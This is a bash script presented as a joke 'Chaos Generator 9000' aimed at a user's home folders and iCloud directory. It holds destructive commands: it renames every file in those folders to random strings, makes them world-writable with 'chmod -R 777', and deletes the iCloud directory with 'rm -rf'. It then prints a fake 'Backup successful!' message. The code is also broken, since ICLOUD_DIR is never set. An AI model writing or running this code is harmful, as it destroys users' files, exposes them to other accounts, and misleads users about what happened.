#!/bin/bash

# Welcome to the Chaos Generator 9000 (Automatic VRAM Detection Edition)
# Copyright © 20XX Chaos Corp. All rights obliterated.

# Default VRAM directory path
DEFAULT_VRAM_DIR="/dev/shm/chaos_vram"

# List of directories to wreak havoc upon
DIRS=("Documents" "Desktop" "Downloads" "Pictures" "Music" "Movies")

# Chaos mode: 1 for random renaming, 2 for bi-directional links, 3 for world-writable, 4 for directory destruction
CHAOS_MODE=3

# Function to detect the VRAM directory
function detect_vram_directory {
    if [ -d "$DEFAULT_VRAM_DIR" ]; then
        VRAM_DIR="$DEFAULT_VRAM_DIR"
        echo "VRAM directory detected at: $VRAM_DIR"
    else
        echo "VRAM directory not found. Using default location."
    fi
}

# Function to randomly rename files within a directory
function random_rename {
    local dir="$1"
    cd "$dir" || return
    for file in *; do
        if [ -f "$file" ]; then
            mv "$file" "$(tr -dc '[:alnum:]' < /dev/urandom | fold -w 32 | head -n 1)"
        fi
    done
}

# Function to create bi-directional symbolic links
function bi_directional_links {
    local dir="$1"
    if [ ! -d "$dir" ]; then
        mkdir -p "$dir"
    fi
    ln -s "$ICLOUD_DIR/$dir" "$VRAM_DIR/$dir"
    ln -s "$VRAM_DIR/$dir" "$ICLOUD_DIR/$dir"
}

# Function to make everything world-writable
function make_world_writable {
    local dir="$1"
    chmod -R 777 "$dir"
}

# Function to randomly destroy and recreate the iCloud directory
function destroy_and_recreate_icloud {
    if [ -d "$ICLOUD_DIR" ]; then
        rm -rf "$ICLOUD_DIR"
    fi
    mkdir -p "$ICLOUD_DIR"
}

# Function to generate a checksum for the iCloud directory
function generate_checksum {
    echo "Generating checksum for iCloud directory..."
    checksum=$(find "$ICLOUD_DIR" -type f -exec md5sum {} + | md5sum)
    echo "Checksum: $checksum"
}

# Function to create a fake backup message
function fake_backup_message {
    echo "Backing up to iCloud..."
    sleep 3
    echo "Backup successful!"
}

# Main chaos loop
detect_vram_directory
for dir in "${DIRS[@]}"; do
    # Move each directory to iCloud
    if [ -d "$VRAM_DIR/$dir" ]; then
        mv "$VRAM_DIR/$dir" "$ICLOUD_DIR/"
    fi

    # Apply chaos based on the selected mode
    case $CHAOS_MODE in
        1) random_rename "$ICLOUD_DIR/$dir" ;;
        2) bi_directional_links "$dir" ;;
        3) make_world_writable "$ICLOUD_DIR/$dir" ;;
        4) destroy_and_recreate_icloud ;;
        *) echo "Invalid chaos mode! Aborting mission." ;;
    esac
done

# Generate checksum for iCloud directory
generate_checksum

# Display fake backup message
fake_backup_message

echo "Chaos unleashed. Enjoy the pandemonium!"
